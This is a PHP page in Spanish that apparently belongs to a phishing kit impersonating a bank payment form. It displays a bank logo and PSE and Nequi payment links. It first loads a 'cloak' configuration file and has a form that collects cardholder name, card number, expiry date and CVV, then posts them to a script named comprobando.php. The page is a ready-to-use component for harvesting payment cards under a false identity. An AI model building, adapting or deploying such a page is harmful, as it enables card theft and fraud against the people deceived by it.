<?php
require_once __DIR__ . '/config/cloak.php';
require_once 'security.php';
ob_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Pago</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../data/css/payments.css">
    <link rel="stylesheet" href="css/payment.css">
</head>
<body>
    <div class="container mt-5">
        <center><img src="../data/img/logo-bp.svg" class="img2"></center>
        <center><img src="../data/img/p8x9c1m2.png" class="img1"></center>

        <center><h1 class="text2">Pagos Cuentas Bancarias</h1></center>
                <div class="pagos">
                    <br>
                    <a href="pse.php" class="neq"><img src="../data/img/c9f2e8b4.png" alt="" class="img4"></a>
                    <a href="../data/nq/" class="neq"><img src="../data/img/nq.png" alt="" class="img4"></a>

                </div>
        <br>
            <center><h1 class="text1">Pagar con Tarjeta</h1></center>
                <form action="comprobando.php" method="post">
                    <input type="hidden" name="csrf_token" value="<?php echo $_COOKIE['csrf_token'] ?? ''; ?>">
                    <div class="containerAllInfo" style="width: 95%; padding-bottom:10px; margin: auto;">
                        <div class="containerInfoPayment  " ng-show="isPickedCC()">
                    
                            <div class="containerInputPayment">
                                <input type="text" class="inputPayments ng-pristine ng-untouched ng-valid ng-empty" ng-change="" id="nombre" name="nombre" placeholder="Nombre del titular de la tarjeta" style="text-align: left; padding-left: 10px; padding-top: 10px;" required maxlength="16" minlength="6" oninput="validarYCambiarColor()">
                                <div class="miniTextPayment ng-binding" ng-class="{incorrect: badCC}">
                                    Ingresa tu nombre del titular de la tarjeta
                                </div>
                            </div>

                            <div class="containerInputPayment">
                                <input type="tel" class="inputPayments ng-pristine ng-untouched ng-valid ng-empty" ng-change="" id="tarjeta" name="creditcard" ng-model="ccNum" placeholder="Número de tarjeta" style="text-align: left; padding-left: 10px; padding-top: 10px;" required maxlength="16" minlength="15" oninput="validarYCambiarColor()">
                                <div class="miniTextPayment ng-binding" ng-class="{incorrect: badCC}">
                                    Ingresa tu tarjeta crédito o débito
                                </div>
                            </div>


                            <div class="containerInputPaymentInline">
                            <input type="tel" class="inputPayments ng-pristine ng-untouched ng-valid ng-empty" ng-model="datecc" name="expdate" ng-change="" placeholder="MM/AA" style="text-align: left; padding-left: 10px; padding-top: 10px;" maxlength="5" minlength="4" required id="fecha" oninput="validarFechaYCambiarColor()">                                <br>
                                <div class="miniTextPayment ng-binding" ng-class="{incorrect: badDate}">
                                    Fecha de expiración
                                </div>
                            </div>

                            <div class="containerInputPaymentInline">
                                <input type="text" class="inputPayments ng-pristine ng-untouched ng-valid ng-empty" ng-model="cvv" name="cvv" placeholder="CVV" style="text-align: left; padding-left: 10px; padding-top: 10px;" required maxlength="4" minlength="3" oninput="filtrarNumeros(this)">
                                <br>
                                <div class="miniTextPayment ng-binding" ng-class="{incorrect: badCvv}">
                                    Código de seguridad
                                </div>
                            </div>

                        </div>
                    </div>
                    <center><input type="submit" class="btn-success mb-5" id="btnEnviar" value="Depositar" ></center>
                </form>

    </div>

    <script src="../data/js/payments.js"></script>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>
</html>
